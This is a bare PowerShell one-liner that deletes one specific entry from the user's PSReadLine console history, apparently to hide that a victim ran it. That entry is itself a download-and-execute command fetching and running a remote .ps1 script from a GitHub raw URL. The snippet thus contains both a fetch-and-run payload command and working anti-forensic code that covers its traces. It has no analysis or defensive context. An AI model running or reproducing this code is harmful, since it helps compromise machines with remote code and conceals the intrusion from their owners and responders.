$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";if(Test-Path $h){$c=@(Get-Content $h -ErrorAction SilentlyContinue);$n=$c|?{$_ -ne 'iex (iwr "https://raw.githubusercontent.com/reggiewilliamson128-code/Main/refs/heads/main/.ps1").Content'};if($c.Count -ne $n.Count){$n|Set-Content $h}}
